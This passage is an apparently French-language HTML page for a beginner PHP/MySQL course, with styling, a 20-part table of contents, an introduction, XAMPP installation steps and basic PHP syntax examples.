<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Formation php</title>
    <style>
        /* === FORMATION PHP - CSS PROFESSIONNEL === */

/* Variables CSS pour la cohérence */
:root {
    --primary-color: #667eea;
    --secondary-color: #764ba2;
    --accent-color: #f093fb;
    --success-color: #4ecdc4;
    --warning-color: #ffe66d;
    --danger-color: #ff6b6b;
    --dark-color: #2c3e50;
    --light-color: #ffffff;
    --gray-50: #f8fafc;
    --gray-100: #f1f5f9;
    --gray-200: #e2e8f0;
    --gray-300: #cbd5e1;
    --gray-400: #94a3b8;
    --gray-500: #64748b;
    --gray-600: #475569;
    --gray-700: #334155;
    --gray-800: #1e293b;
    --gray-900: #0f172a;
    
    --border-radius-sm: 0.5rem;
    --border-radius-md: 0.75rem;
    --border-radius-lg: 1rem;
    --border-radius-xl: 1.5rem;
    
    --shadow-sm: 0 1px 2px 0 rgb(0 0 0 / 0.05);
    --shadow-md: 0 4px 6px -1px rgb(0 0 0 / 0.1), 0 2px 4px -2px rgb(0 0 0 / 0.1);
    --shadow-lg: 0 10px 15px -3px rgb(0 0 0 / 0.1), 0 4px 6px -4px rgb(0 0 0 / 0.1);
    --shadow-xl: 0 20px 25px -5px rgb(0 0 0 / 0.1), 0 8px 10px -6px rgb(0 0 0 / 0.1);
    --shadow-2xl: 0 25px 50px -12px rgb(0 0 0 / 0.25);
    
    --transition-fast: all 0.15s ease;
    --transition-normal: all 0.3s ease;
    --transition-slow: all 0.5s ease;
}

/* Reset moderne */
*,
*::before,
*::after {
    box-sizing: border-box;
    margin: 0;
    padding: 0;
}

html {
    scroll-behavior: smooth;
    font-size: 16px;
}

body {
    font-family: 'Inter', 'SF Pro Display', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
    line-height: 1.7;
    color: var(--gray-800);
    background: linear-gradient(135deg, var(--primary-color) 0%, var(--secondary-color) 50%, var(--accent-color) 100%);
    background-attachment: fixed;
    min-height: 100vh;
    -webkit-font-smoothing: antialiased;
    -moz-osx-font-smoothing: grayscale;
}

/* === HEADER FORMATION === */
.formation-php-header {
    background: linear-gradient(135deg, rgba(255,255,255,0.1), rgba(255,255,255,0.05));
    backdrop-filter: blur(20px);
    border: 1px solid rgba(255,255,255,0.2);
    border-radius: var(--border-radius-xl);
    color: var(--light-color);
    padding: 4rem 2rem;
    margin: 2rem auto;
    max-width: 1200px;
    text-align: center;
    box-shadow: var(--shadow-2xl);
    position: relative;
    overflow: hidden;
}

.formation-php-header::before {
    content: '';
    position: absolute;
    top: 0;
    left: 0;
    right: 0;
    bottom: 0;
    background: linear-gradient(45deg, transparent 30%, rgba(255,255,255,0.1) 50%, transparent 70%);
    transform: translateX(-100%);
    animation: shimmer 3s infinite;
}

@keyframes shimmer {
    100% { transform: translateX(100%); }
}

.image-logo-php {
    margin-bottom: 2rem;
}

.image-logo-php img {
    width: 100px;
    height: 100px;
    border-radius: 50%;
    border: 4px solid rgba(255,255,255,0.3);
    box-shadow: var(--shadow-xl);
    transition: var(--transition-normal);
}

.image-logo-php img:hover {
    transform: scale(1.1) rotate(5deg);
    border-color: var(--accent-color);
}

.formation-php-title {
    font-size: clamp(2.5rem, 5vw, 4rem);
    font-weight: 800;
    margin-bottom: 1.5rem;
    background: linear-gradient(135deg, var(--light-color), var(--accent-color));
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
    background-clip: text;
    letter-spacing: -0.02em;
}

.formation-php-description {
    font-size: 1.25rem;
    opacity: 0.9;
    max-width: 700px;
    margin: 0 auto;
    font-weight: 400;
    line-height: 1.6;
}

/* === LAYOUT PRINCIPAL === */
.formation-php {
    display: grid;
    grid-template-columns: 320px 1fr;
    gap: 3rem;
    max-width: 1400px;
    margin: 0 auto;
    padding: 2rem;
    min-height: calc(100vh - 200px);
}

/* === SOMMAIRE LATERAL === */
.sommaire-cours {
    background: rgba(255,255,255,0.95);
    backdrop-filter: blur(20px);
    border: 1px solid rgba(255,255,255,0.3);
    border-radius: var(--border-radius-xl);
    padding: 2rem;
    height: fit-content;
    position: sticky;
    top: 2rem;
    box-shadow: var(--shadow-xl);
    transition: var(--transition-normal);
}

.sommaire-cours:hover {
    transform: translateY(-2px);
    box-shadow: var(--shadow-2xl);
}

.sommaire-content {
    position: relative;
}

.sommaire-content::before {
    content: '📚';
    font-size: 2rem;
    display: block;
    text-align: center;
    margin-bottom: 1rem;
}

.sommaire-nav-links {
    list-style: none;
    display: grid;
    gap: 0.5rem;
}

.sommaire-nav-link {
    position: relative;
}

.sommaire-nav-link-iteme {
    display: block;
    padding: 1rem 1.5rem;
    color: var(--gray-700);
    text-decoration: none;
    border-radius: var(--border-radius-md);
    transition: var(--transition-fast);
    font-size: 0.95rem;
    font-weight: 500;
    border: 1px solid transparent;
    position: relative;
    overflow: hidden;
}

.sommaire-nav-link-iteme::before {
    content: '';
    position: absolute;
    top: 0;
    left: -100%;
    width: 100%;
    height: 100%;
    background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
    transition: var(--transition-normal);
}

.sommaire-nav-link-iteme:hover {
    background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
    color: var(--light-color);
    transform: translateX(8px);
    border-color: var(--accent-color);
    box-shadow: var(--shadow-lg);
}

.sommaire-nav-link-iteme:hover::before {
    left: 100%;
}

.sommaire-nav-link-iteme:active {
    transform: translateX(8px) scale(0.98);
}

/* === CONTENU PRINCIPAL === */
.conten-course {
    background: rgba(255,255,255,0.95);
    backdrop-filter: blur(20px);
    border: 1px solid rgba(255,255,255,0.3);
    border-radius: var(--border-radius-xl);
    padding: 3rem;
    box-shadow: var(--shadow-xl);
    position: relative;
    overflow: hidden;
}

.conten-course::before {
    content: '';
    position: absolute;
    top: 0;
    left: 0;
    right: 0;
    height: 4px;
    background: linear-gradient(90deg, var(--primary-color), var(--accent-color), var(--secondary-color));
}

/* === SECTIONS ET PARTIES === */
.section,
.part1-php-course,
.part2-php-course,
.part4-php-course,
.part5-php-course,
.part6,
.part7,
.part8,
.part9,
.part10,
.part11,
.part12,
.part13,
.part14,
.part15,
.part16,
.part17,
.part19,
.part20,
.troisieme-partie,
.quatrieme-partie {
    margin-bottom: 4rem;
    position: relative;
}

.section h1,
.section h2,
.part1-php-course h2,
.part2-php-course h2,
.part4-php-course h1,
.part5-php-course h1,
.part6 h2,
.part7 h2,
.part8 h2,
.part9 h2,
.part10 h2,
.part11 h2,
.part12 h2,
.part13 h2,
.part14 h2,
.part15 h2,
.part16 h2,
.part17 h2,
.part19 h2,
.part20 h2,
.header h1,
.header-part4 h1 {
    background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
    color: var(--light-color);
    padding: 2rem 2.5rem;
    border-radius: var(--border-radius-lg);
    margin-bottom: 2.5rem;
    font-size: clamp(1.5rem, 3vw, 2.2rem);
    font-weight: 700;
    box-shadow: var(--shadow-lg);
    position: relative;
    overflow: hidden;
    border: 1px solid rgba(255,255,255,0.2);
}

.section h1::after,
.section h2::after,
.part1-php-course h2::after,
.part2-php-course h2::after,
.part4-php-course h1::after,
.part5-php-course h1::after,
.part6 h2::after,
.part7 h2::after,
.part8 h2::after,
.part9 h2::after,
.part10 h2::after,
.part11 h2::after,
.part12 h2::after,
.part13 h2::after,
.part14 h2::after,
.part15 h2::after,
.part16 h2::after,
.part17 h2::after,
.part19 h2::after,
.part20 h2::after,
.header h1::after,
.header-part4 h1::after {
    content: '';
    position: absolute;
    top: 0;
    right: 0;
    width: 100px;
    height: 100%;
    background: linear-gradient(90deg, transparent, rgba(255,255,255,0.1));
    transform: skewX(-20deg);
}

.section h3,
.part1-php-course h3,
.part2-php-course h3,
.part4-php-course h3,
.part5-php-course h3,
.part6 h3,
.part7 h3,
.part8 h3,
.part9 h3,
.part10 h3,
.part11 h3,
.part12 h3,
.part13 h3,
.part14 h3,
.part15 h3,
.part16 h3,
.part17 h3,
.part19 h3,
.part20 h3 {
    color: var(--dark-color);
    font-size: 1.5rem;
    font-weight: 600;
    margin: 2.5rem 0 1.5rem 0;
    padding: 1rem 0 1rem 1.5rem;
    border-left: 4px solid var(--accent-color);
    background: linear-gradient(90deg, rgba(240, 147, 251, 0.1), transparent);
    border-radius: 0 var(--border-radius-md) var(--border-radius-md) 0;
    position: relative;
}

.section h4,
.part4-php-course h4,
.part5-php-course h4,
.part6 h4,
.part7 h4,
.part8 h4,
.part9 h4,
.part10 h4,
.part11 h4,
.part12 h4,
.part13 h4,
.part14 h4,
.part15 h4,
.part16 h4,
.part17 h4,
.part19 h4,
.part20 h4 {
    color: var(--gray-700);
    font-size: 1.25rem;
    font-weight: 600;
    margin: 2rem 0 1rem 0;
    padding: 0.75rem 0;
    border-bottom: 2px solid var(--gray-200);
}

.section h5,
.part4-php-course h5,
.part5-php-course h5,
.part6 h5,
.part7 h5,
.part8 h5,
.part9 h5,
.part10 h5,
.part11 h5,
.part12 h5,
.part13 h5,
.part14 h5,
.part15 h5,
.part16 h5,
.part17 h5,
.part19 h5,
.part20 h5 {
    color: var(--gray-600);
    font-size: 1.1rem;
    font-weight: 600;
    margin: 1.5rem 0 0.75rem 0;
}

/* === PARAGRAPHES ET TEXTE === */
p {
    margin-bottom: 1.5rem;
    line-height: 1.7;
    font-size: 1rem;
    color: var(--gray-700);
}

.intro-text {
    background: linear-gradient(135deg, var(--gray-50), var(--gray-100));
    border: 1px solid var(--gray-200);
    border-radius: var(--border-radius-lg);
    padding: 2rem;
    margin: 2rem 0;
    position: relative;
    font-size: 1.1rem;
    line-height: 1.6;
}

.intro-text::before {
    content: '💡';
    position: absolute;
    top: -10px;
    left: 20px;
    background: var(--light-color);
    padding: 0.5rem;
    border-radius: 50%;
    font-size: 1.2rem;
}

/* === BLOCS DE CODE === */
pre {
    background: var(--gray-900);
    color: var(--gray-100);
    padding: 2rem;
    border-radius: var(--border-radius-lg);
    overflow-x: auto;
    margin: 2rem 0;
    border: 1px solid var(--gray-700);
    box-shadow: var(--shadow-lg);
    position: relative;
    font-family: 'JetBrains Mono', 'Fira Code', 'Consolas', monospace;
    font-size: 0.9rem;
    line-height: 1.6;
}

pre::before {
    content: '';
    position: absolute;
    top: 0;
    left: 0;
    right: 0;
    height: 3px;
    background: linear-gradient(90deg, var(--success-color), var(--warning-color), var(--danger-color));
}

code {
    background: var(--gray-100);
    color: var(--danger-color);
    padding: 0.25rem 0.5rem;
    border-radius: var(--border-radius-sm);
    font-family: 'JetBrains Mono', 'Fira Code', 'Consolas', monospace;
    font-size: 0.9em;
    border: 1px solid var(--gray-200);
}

pre code {
    background: none;
    color: inherit;
    padding: 0;
    border: none;
    font-size: inherit;
}

/* === COLORATION SYNTAXIQUE === */
.tag { color: #f39c12; }
.keyword { color: #3498db; }
.string { color: #2ecc71; }
.comment { color: #95a5a6; font-style: italic; }
.number { color: #e67e22; }

/* === BOITES D'INFORMATION === */
.info-box,
.explanation-box,
.warning-box,
.example-section,
.definition-content,
.installation-content-text,
.concept-title,
.tips-list {
    padding: 2rem;
    border-radius: var(--border-radius-lg);
    margin: 2rem 0;
    border: 1px solid;
    position: relative;
    box-shadow: var(--shadow-md);
}

.info-box {
    background: linear-gradient(135deg, #ebf8ff, #dbeafe);
    border-color: var(--primary-color);
    color: var(--gray-800);
}

.explanation-box {
    background: linear-gradient(135deg, #f0f9ff, #e0f2fe);
    border-color: #0ea5e9;
    color: var(--gray-800);
}

.warning-box {
    background: linear-gradient(135deg, #fffbeb, #fef3c7);
    border-color: var(--warning-color);
    color: var(--gray-800);
}

.example-section {
    background: linear-gradient(135deg, #f0fdf4, #dcfce7);
    border-color: var(--success-color);
    color: var(--gray-800);
}

.definition-content {
    background: linear-gradient(135deg, #fdf2f8, #fce7f3);
    border-color: #ec4899;
    color: var(--gray-800);
}

.installation-content-text {
    background: linear-gradient(135deg, #f8fafc, #f1f5f9);
    border-color: var(--gray-300);
    color: var(--gray-800);
}

.concept-title {
    background: linear-gradient(135deg, var(--accent-color), var(--primary-color));
    color: var(--light-color);
    font-weight: 700;
    font-size: 1.2rem;
    text-align: center;
    margin: 2.5rem 0 1.5rem 0;
}

/* === LISTES === */
ul, ol {
    margin: 1.5rem 0;
    padding-left: 2rem;
}

li {
    margin-bottom: 0.75rem;
    line-height: 1.6;
}

ul li::marker {
    color: var(--primary-color);
}

ol li::marker {
    color: var(--primary-color);
    font-weight: 600;
}

.tips-list ul {
    display: grid;
    gap: 1rem;
}

.tips-list li {
    background: rgba(255,255,255,0.7);
    padding: 1rem;
    border-radius: var(--border-radius-md);
    border-left: 4px solid var(--success-color);
    list-style: none;
    position: relative;
}

.tips-list li::before {
    content: '✓';
    position: absolute;
    left: -2px;
    top: 50%;
    transform: translateY(-50%);
    background: var(--success-color);
    color: white;
    width: 20px;
    height: 20px;
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 0.8rem;
    font-weight: bold;
}

/* === TABLEAUX === */
table {
    width: 100%;
    border-collapse: collapse;
    margin: 2rem 0;
    background: var(--light-color);
    border-radius: var(--border-radius-lg);
    overflow: hidden;
    box-shadow: var(--shadow-lg);
    border: 1px solid var(--gray-200);
}

th, td {
    padding: 1.25rem;
    text-align: left;
    border-bottom: 1px solid var(--gray-200);
}

th {
    background: linear-gradient(135deg, var(--gray-800), var(--gray-700));
    color: var(--light-color);
    font-weight: 600;
    font-size: 0.95rem;
    text-transform: uppercase;
    letter-spacing: 0.5px;
}

tr:hover {
    background-color: var(--gray-50);
}

tr:last-child td {
    border-bottom: none;
}

.operator-table {
    font-family: 'JetBrains Mono', monospace;
    font-size: 0.9rem;
}

/* === SECTIONS SPÉCIALES === */
.test-section {
    background: linear-gradient(135deg, var(--gray-50), rgba(255,255,255,0.8));
    border: 2px dashed var(--primary-color);
    border-radius: var(--border-radius-xl);
    padding: 2.5rem;
    margin: 3rem 0;
    text-align: center;
    position: relative;
    box-shadow: var(--shadow-md);
}

.test-section::before {
    content: '🧪';
    position: absolute;
    top: -15px;
    left: 50%;
    transform: translateX(-50%);
    background: var(--light-color);
    padding: 0.5rem;
    border-radius: 50%;
    font-size: 1.5rem;
    border: 2px solid var(--primary-color);
}

.test-section h3 {
    color: var(--primary-color) !important;
    margin-bottom: 1.5rem;
    border: none !important;
    background: none !important;
    padding: 0 !important;
}

.result-box {
    background: var(--gray-900);
    color: var(--gray-100);
    padding: 1.5rem;
    border-radius: var(--border-radius-md);
    margin: 1.5rem 0;
    font-family: 'JetBrains Mono', monospace;
    border-left: 4px solid var(--success-color);
    box-shadow: var(--shadow-md);
}

.url-highlight {
    background: var(--gray-900);
    color: var(--success-color);
    padding: 1rem 1.5rem;
    border-radius: var(--border-radius-md);
    font-family: 'JetBrains Mono', monospace;
    margin: 1.5rem 0;
    border: 1px solid var(--gray-700);
    display: inline-block;
}

/* === LIENS === */
a {
    color: var(--primary-color);
    text-decoration: none;
    font-weight: 500;
    transition: var(--transition-fast);
    position: relative;
}

a:hover {
    color: var(--secondary-color);
}

a::after {
    content: '';
    position: absolute;
    bottom: -2px;
    left: 0;
    width: 0;
    height: 2px;
    background: var(--accent-color);
    transition: var(--transition-fast);
}

a:hover::after {
    width: 100%;
}

/* === DETAILS/SUMMARY === */
details {
    background: var(--light-color);
    border-radius: var(--border-radius-lg);
    margin: 2rem 0;
    border: 1px solid var(--gray-200);
    box-shadow: var(--shadow-md);
    overflow: hidden;
}

summary {
    background: linear-gradient(135deg, var(--gray-700), var(--gray-600));
    color: var(--light-color);
    padding: 1.5rem 2rem;
    cursor: pointer;
    font-weight: 600;
    font-size: 1.1rem;
    transition: var(--transition-normal);
    display: flex;
    align-items: center;
    gap: 1rem;
}

summary:hover {
    background: linear-gradient(135deg, var(--gray-600), var(--gray-500));
}

summary::before {
    content: '💡';
    font-size: 1.2rem;
}

details[open] summary {
    border-bottom: 1px solid var(--gray-200);
}

details > div {
    padding: 2rem;
}

/* === ANIMATIONS === */
@keyframes fadeInUp {
    from {
        opacity: 0;
        transform: translateY(30px);
    }
    to {
        opacity: 1;
        transform: translateY(0);
    }
}

@keyframes slideInRight {
    from {
        opacity: 0;
        transform: translateX(30px);
    }
    to {
        opacity: 1;
        transform: translateX(0);
    }
}

.section {
    animation: fadeInUp 0.6s ease-out;
}

.sommaire-cours {
    animation: slideInRight 0.8s ease-out;
}

.celebration {
    font-size: 1.3em;
    display: inline-block;
    animation: bounce 1s infinite;
}

@keyframes bounce {
    0%, 20%, 50%, 80%, 100% { transform: translateY(0); }
    40% { transform: translateY(-10px); }
    60% { transform: translateY(-5px); }
}

/* === RESPONSIVE DESIGN === */
@media (max-width: 1200px) {
    .formation-php {
        grid-template-columns: 280px 1fr;
        gap: 2rem;
    }
    
    .formation-php-header {
        padding: 3rem 1.5rem;
    }
}

@media (max-width: 768px) {
    .formation-php {
        grid-template-columns: 1fr;
        gap: 1.5rem;
        padding: 1rem;
    }
    
    .sommaire-cours {
        position: static;
        order: 2;
        padding: 1.5rem;
    }
    
    .conten-course {
        order: 1;
        padding: 2rem;
    }
    
    .formation-php-header {
        padding: 2rem 1rem;
        margin: 1rem;
    }
    
    .formation-php-title {
        font-size: 2.5rem;
    }
    
    .formation-php-description {
        font-size: 1.1rem;
    }
    
    .section h1,
    .section h2,
    .header h1 {
        padding: 1.5rem;
        font-size: 1.8rem;
    }
    
    .section h3 {
        font-size: 1.3rem;
        padding: 0.75rem 0 0.75rem 1rem;
    }
    
    pre {
        padding: 1.5rem;
        font-size: 0.85rem;
        overflow-x: auto;
    }
    
    .info-box,
    .explanation-box,
    .warning-box,
    .example-section {
        padding: 1.5rem;
    }
    
    .test-section {
        padding: 2rem;
    }
}

@media (max-width: 480px) {
    body {
        font-size: 0.9rem;
    }
    
    .formation-php-header {
        padding: 1.5rem 0.75rem;
    }
    
    .formation-php-title {
        font-size: 2rem;
    }
    
    .conten-course {
        padding: 1.5rem;
    }
    
    .section h1,
    .section h2 {
        font-size: 1.5rem;
        padding: 1rem;
    }
    
    .section h3 {
        font-size: 1.2rem;
    }
    
    pre {
        padding: 1rem;
        font-size: 0.8rem;
    }
    
    .info-box,
    .explanation-box,
    .warning-box,
    .example-section {
        padding: 1rem;
    }
    
    table {
        font-size: 0.85rem;
    }
    
    th, td {
        padding: 0.75rem;
    }
}

/* === SCROLLBAR PERSONNALISÉE === */
::-webkit-scrollbar {
    width: 8px;
    height: 8px;
}

::-webkit-scrollbar-track {
    background: var(--gray-100);
    border-radius: 4px;
}

::-webkit-scrollbar-thumb {
    background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
    border-radius: 4px;
}

::-webkit-scrollbar-thumb:hover {
    background: linear-gradient(135deg, var(--secondary-color), var(--accent-color));
}

/* === PRINT STYLES === */
@media print {
    body {
        background: white !important;
        color: black !important;
    }
    
    .formation-php-header,
    .sommaire-cours,
    .conten-course {
        background: white !important;
        color: black !important;
        box-shadow: none !important;
        border: 1px solid #ddd !important;
    }
    
    .formation-php {
        grid-template-columns: 1fr;
        gap: 1rem;
    }
    
    pre {
        background: #f5f5f5 !important;
        color: black !important;
        border: 1px solid #ddd !important;
    }
    
    .info-box,
    .explanation-box,
    .warning-box,
    .example-section {
        background: #f9f9f9 !important;
        border: 1px solid #ddd !important;
        color: black !important;
    }
    
    .section h1,
    .section h2 {
        background: #f0f0f0 !important;
        color: black !important;
    }
    
    a {
        color: black !important;
        text-decoration: underline !important;
    }
}

/* === UTILITAIRES === */
.text-center { text-align: center; }
.text-left { text-align: left; }
.text-right { text-align: right; }

.mt-1 { margin-top: 0.5rem; }
.mt-2 { margin-top: 1rem; }
.mt-3 { margin-top: 1.5rem; }
.mt-4 { margin-top: 2rem; }

.mb-1 { margin-bottom: 0.5rem; }
.mb-2 { margin-bottom: 1rem; }
.mb-3 { margin-bottom: 1.5rem; }
.mb-4 { margin-bottom: 2rem; }

.p-1 { padding: 0.5rem; }
.p-2 { padding: 1rem; }
.p-3 { padding: 1.5rem; }
.p-4 { padding: 2rem; }
    </style>
</head>
<body>
    <div class="formation-php-header">
        <div class="image-logo-php">
            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR2FrgWpuOnMmIdN-OTGQNN4OUiS9L-3dsS9Q&s" alt="">
        </div>
        <h1 class="formation-php-title">Formation php</h1>
        <p class="formation-php-description">
            Cette formation est dédiée à l'apprentissage du langage PHP et MySql, un langage de script côté serveur largement utilisé pour le développement web.
        </p>
    </div>
    <div class="formation-php">
        <aside class="sommaire-cours">
        <div class="sommaire-content">
            <ol class="sommaire-nav-links">
                <li class="sommaire-nav-link">
                    <a href="#" class="sommaire-nav-link-iteme">1. Introduction au langage PHP</a>
                </li>
                <li class="sommaire-nav-link">
                    <a href="#" class="sommaire-nav-link-iteme">2. Installation de l’environnement (XAMPP, WAMP, Laragon)</a>
                </li>
                <li class="sommaire-nav-link">
                    <a href="#" class="sommaire-nav-link-iteme">3. Syntaxe de base et premier script PHP</a>
                </li>
                <li class="sommaire-nav-link">
                    <a href="#" class="sommaire-nav-link-iteme">4. Variables, constantes et types de données</a>
                </li>
                <li class="sommaire-nav-link">
                    <a href="#" class="sommaire-nav-link-iteme">5. Opérateurs et expressions</a>
                </li>
                <li class="sommaire-nav-link">
                    <a href="#" class="sommaire-nav-link-iteme">6. Structures conditionnelles (if, else, switch)</a>
                </li>
                <li class="sommaire-nav-link">
                    <a href="#" class="sommaire-nav-link-iteme">7. Boucles (while, for, foreach)</a>
                </li>
                <li class="sommaire-nav-link">
                    <a href="#" class="sommaire-nav-link-iteme">8. Fonctions et portée des variables</a>
                </li>
                <li class="sommaire-nav-link">
                    <a href="#" class="sommaire-nav-link-iteme">9. Tableaux (simples et associatifs)</a>
                </li>
                <li class="sommaire-nav-link">
                    <a href="#" class="sommaire-nav-link-iteme">10. Introduction à MySQL et à phpMyAdmin</a>
                </li>
                <li class="sommaire-nav-link">
                    <a href="#" class="sommaire-nav-link-iteme">11. Connexion PHP à MySQL (PDO ou MySQLi)</a>
                </li>
                <li class="sommaire-nav-link">
                    <a href="#" class="sommaire-nav-link-iteme">12. Requêtes SQL : SELECT, INSERT, UPDATE, DELETE</a>
                </li>
                <li class="sommaire-nav-link">
                    <a href="#" class="sommaire-nav-link-iteme">13. Formulaires HTML et traitement en PHP</a>
                </li>
                <li class="sommaire-nav-link">
                    <a href="#" class="sommaire-nav-link-iteme">14. Validation et sécurisation des données</a>
                </li>
                <li class="sommaire-nav-link">
                    <a href="#" class="sommaire-nav-link-iteme">15. Sessions et cookies</a>
                </li>
                <li class="sommaire-nav-link">
                    <a href="#" class="sommaire-nav-link-iteme">16. Upload de fichiers en PHP</a>
                </li>
                <li class="sommaire-nav-link">
                    <a href="#" class="sommaire-nav-link-iteme">17. Notions de programmation orientée objet (POO)</a>
                </li>
                <li class="sommaire-nav-link">
                    <a href="#" class="sommaire-nav-link-iteme">18. CRUD complet en PHP/MySQL</a>
                </li>
                <li class="sommaire-nav-link">
                    <a href="#" class="sommaire-nav-link-iteme">19. Architecture MVC simplifiée</a>
                </li>
                <li class="sommaire-nav-link">
                    <a href="#" class="sommaire-nav-link-iteme">20. Bonnes pratiques et sécurité (hash, injection SQL, XSS)</a>
                </li>
            </ol>
        </div>
        </aside>

        <main class="conten-course">
            <div class="conten-php-course">
                <div class="part1-php-course">
                    <h2>Première partie : Introduction au langage PHP</h2>
                    <div class="introduction-content">
                        <p>Dans cette première partie, nous allons explorer les bases du langage PHP et comprendre ce qu’est réellement ce langage.</p>
                        <b>Définition de PHP</b>
                        <div class="definition-content">
                            <p>PHP (Hypertext Preprocessor) est un langage de script côté serveur, principalement utilisé pour le développement web. Il permet de créer des pages web dynamiques et interactives en intégrant du code dans des fichiers HTML.</p>
                            <p>PHP est open source, ce qui signifie qu'il est librement disponible et peut être modifié par les développeurs. Il est compatible avec de nombreux systèmes d'exploitation et serveurs web, ce qui en fait un choix populaire pour les développeurs web.</p>
                            <p>Vous entendrez dire que PHP est un langage dépassé et qu'il est vieux. Mais sachez qu'il continue d'évoluer et de s'améliorer avec le temps, et qu'il reste largement utilisé dans l'industrie.</p>
                            <p>PHP est souvent utilisé en conjonction avec des bases de données, comme MySQL, pour stocker et récupérer des données. Il offre également de nombreuses fonctionnalités pour la gestion des sessions, la manipulation de fichiers, et bien plus encore.</p>
                        </div>
                    </div>
                </div>
                <div class="part2-php-course">
                    <h2>Deuxième partie : Installation de l’environnement PHP</h2>
                    <div class="installation-php">
                        <h3 class="installation-php-en-local">Installation de PHP en local</h3>
                        <div class="installation-content-text">
                            <p>Pour commencer à développer en PHP, il est nécessaire d'installer un environnement de développement local. Cela inclut généralement un serveur web (comme Apache), PHP lui-même, et un SGBD (Système de Gestion de Base de Données) comme MySQL pour gérer les données.</p>
                            <p>Rappelez-vous que PHP est un langage côté serveur, ce qui signifie qu'il s'exécute sur le serveur et génère du HTML qui est ensuite envoyé au navigateur de l'utilisateur.</p>
                            <b><p>Il existe plusieurs solutions pour installer PHP en local, parmi lesquelles :</p></b>
                            
                            <h3 class="Windows">Installation de PHP sur Windows</h3>
                            <div class="windows-installation-content">
                                <p>Pour installer PHP sur Windows, vous pouvez utiliser des solutions comme XAMPP, WAMP ou MAMP, qui incluent PHP, MySQL et Apache dans un seul package.</p>
                                <p>Pour notre part et pour cette formation, nous allons utiliser XAMPP. Pour plus de détails sur XAMPP, <span><a href="#">cliquez ici</a></span>.</p>
                                <h4>Voici les étapes générales pour installer PHP sur Windows :</h4>
                                <ol>
                                    <li>Téléchargez le package XAMPP depuis le site officiel.</li>
                                    <li>Exécutez l'installateur et suivez les instructions à l'écran.</li>
                                    <li>Une fois l'installation terminée, lancez le panneau de contrôle XAMPP.</li>
                                    <li>Démarrez les services Apache et MySQL.</li>
                                    <li>Accédez à votre navigateur préféré, ouvrez un nouvel onglet et tapez "localhost".</li>
                                </ol>
                                <p>Vous verrez alors la page d'accueil de XAMPP s'afficher sur votre navigateur.</p>
                                <i>Vous pouvez maintenant commencer à développer vos applications PHP en plaçant vos fichiers dans le répertoire "htdocs".</i>
                                <p>Si vous rencontrez un problème, alors pas de panique, faites une capture d’écran et envoyez-la via ce formulaire : <span><a href="#">ma page ne s'affiche pas</a></span>.</p>
                            </div>
                        </div>
                    </div>
                    <section class="troisieme-partie">
                          <div class="section-container">
                                <div class="header">
                                    <h1>Syntaxe de base et premier script PHP</h1>
                                    <p>Troisième partie : Maîtrisez les fondamentaux</p>
                                </div>
                                
                                <div class="content">
                                    <div class="intro-text">
                                        Dans cette partie, tu vas apprendre la syntaxe fondamentale du langage PHP et écrire ton tout premier script interactif !
                                    </div>

                                    <div class="section">
                                        <h3>Ouverture et fermeture des balises PHP</h3>
                                        <p>Un script PHP commence toujours par <code>&lt;?php</code> et se termine par <code>?&gt;</code>. C'est comme ouvrir et fermer une porte vers le monde PHP !</p>
                                        <div class="code-block">
                                            <span class="tag">&lt;?php</span>
                                            <span class="comment">// Ceci est un commentaire</span>
                                            <span class="keyword">echo</span> <span class="string">"Bonjour le monde !"</span>;
                                            <span class="tag">?&gt;</span>
                                        </div>
                                        <p>Tout code PHP doit être écrit entre ces balises magiques. En dehors, c'est du HTML classique !</p>
                                    </div>

                                    <div class="section">
                                        <h3>Afficher du contenu avec <code>echo</code></h3>
                                        <p>La commande <code>echo</code> est ton meilleur ami pour afficher des informations à l'écran. C'est simple et puissant !</p>
                                        <div class="code-block">
                                            <span class="tag">&lt;?php</span>
                                            <span class="keyword">echo</span> <span class="string">"Bienvenue dans le monde de PHP !"</span>;
                                            <span class="keyword">echo</span> <span class="string">"Tu vas devenir un expert !"</span>;
                                            <span class="tag">?&gt;</span>
                                        </div>
                                    </div>

                                    <div class="section">
                                        <h3>Commentaires en PHP</h3>
                                        <p>Les commentaires sont essentiels pour documenter ton code. Voici les trois façons de les écrire :</p>
                                        <div class="code-block">
                                            <span class="tag">&lt;?php</span>
                                            <span class="comment">// Ceci est un commentaire sur une ligne</span>
                                            <span class="comment"># Ceci est aussi un commentaire sur une ligne</span>
                                            <span class="comment">/* 
                                            Ceci est un commentaire 
                                            sur plusieurs lignes 
                                            */</span>
                                            <span class="keyword">echo</span> <span class="string">"Les commentaires n'apparaissent pas à l'écran !"</span>;
                                            <span class="tag">?&gt;</span>
                                        </div>
                                    </div>

                                    <div class="section">
                                        <h3>Intégration HTML + PHP</h3>
                                        <p>Voici la vraie magie : mélanger HTML et PHP dans le même fichier !</p>
                                        <div class="code-block html-block">
                                            <span class="tag">&lt;!DOCTYPE html&gt;
                                            &lt;html lang="fr"&gt;
                                            &lt;head&gt;
                                                &lt;title&gt;</span>Ma première page PHP<span class="tag">&lt;/title&gt;
                                                &lt;style&gt;
                                                    body { font-family: Arial; background: #f0f8ff; }
                                                    h1 { color: #333; text-align: center; }
                                                &lt;/style&gt;
                                            &lt;/head&gt;
                                            &lt;body&gt;
                                                &lt;h1&gt;</span><span class="keyword">&lt;?php echo</span> <span class="string">"Bonjour, PHP dynamique !"</span>; <span class="keyword">?&gt;</span><span class="tag">&lt;/h1&gt;
                                                &lt;p&gt;</span><span class="keyword">&lt;?php echo</span> <span class="string">"Aujourd'hui nous sommes le "</span> . <span class="keyword">date</span>(<span class="string">"d/m/Y"</span>); <span class="keyword">?&gt;</span><span class="tag">&lt;/p&gt;
                                            &lt;/body&gt;
                                            &lt;/html&gt;</span>
                                        </div>
                                    </div>

                                    <div class="section">
                                        <h3>Points importants à retenir</h3>
                                        <div class="tips-list">
                                            <ul>
                                                <li>Chaque instruction PHP se termine par un point-virgule <code>;</code></li>
                                                <li>Le code PHP est sensible à la casse pour les variables : <code>$Nom</code> ≠ <code>$nom</code></li>
